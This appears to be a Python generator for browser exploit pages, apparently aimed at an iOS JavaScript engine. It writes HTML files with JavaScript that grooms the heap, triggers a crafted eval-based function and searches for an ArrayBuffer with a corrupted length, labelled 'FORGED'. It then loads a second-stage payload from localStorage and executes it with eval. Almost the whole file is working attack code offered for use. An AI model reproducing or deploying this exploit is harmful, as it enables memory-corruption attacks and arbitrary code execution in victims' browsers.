#!/usr/bin/env python3
"""Generate dense-H ls_final variants (2,174 S2LEN and 2,036 plain)."""
import hashlib, os, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE)
PAT=("[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,"
     "255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255]")
SRC=('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; '
     'return ' + '+'.join(['1.5']*34) + '; })')
def stage_a(H,N=3000,HN=64,VK0=598,s2len=False):
    tail=('var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}\n'
          + ('globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);\n'
             'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n' if s2len else '')
          + 'if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }')
    return f'''"use strict";
var N={N},H={H},HN={HN},VK={VK0};
var PAT={PAT};
if (globalThis.PAT !== PAT) {{
  globalThis.RESULT="RESULT NO_TOPS";
  try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
}} else {{
var S=new Array(N),fb=new Uint8Array(40);
for(var j=0;j<40;j++)fb[j]=PAT[j];
for(var i=0;i<N;i++){{var u=new Uint8Array(957);S[i]=u;}}
for(var k=0;k<HN;k++)S[H+k]=null;
globalThis.f=(0,eval)({SRC!r});
var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
var TN=600,T=new Array(TN),TV=new Array(TN);
for(var i=0;i<TN;i++){{T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}}
var PH=[4,12,20,28,36],VKS=[{VK0},{VK0}-10,{VK0}-20,{VK0}-30,{VK0}-40];
var hit=-1,len=0,ph=-1,vk=-1,nt=0;
for(var pi=0;pi<5&&hit<0;pi++){{
  var p=PH[pi];
  for(var i=0;i<N;i++){{if(S[i]){{for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}}}
  for(var vi=0;vi<5&&hit<0;vi++){{
    var v=VKS[vi]; if(v<16) continue;
    for(var r=0;r<8;r++){{var j=v-2*r;T[j]=null;TV[j]=null;}}
    try{{f();}}catch(e){{}}
    nt++;
    for(var i=0;i<TN;i++){{if(T[i]!==null&&T[i].byteLength!==72){{hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}}}
  }}
}}
if(hit>=0){{globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}}
globalThis.RESULT="RESULT LS C=34 SZ=957 N={N} H={H} HN={HN} HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
globalThis.N1MARK=globalThis.RESULT;
try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
try{{console.log("N1A:"+globalThis.RESULT);}}catch(e){{}}
{tail}
}}
'''
def html(H,s2len):
    a=stage_a(H,s2len=s2len)
    return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
            '<div id="v">N1IOS_LS</div>\n<script>'+a+'</script>\n</body></html>')
if __name__=='__main__':
    Hs=[int(x) for x in sys.argv[1:]] or list(range(0,601,50))
    for H in Hs:
        for s2 in (1,0):
            h=html(H,bool(s2)); name=f'ls_final_h{H}.html' if s2 else f'ls_final_h{H}_2036.html'
            p=os.path.join(LAB,'payload',name); open(p,'w').write(h)
            print(f'{name} raw={len(h)} zlib9={len(zlib.compress(h.encode(),9))} sha256={hashlib.sha256(h.encode()).hexdigest()}')
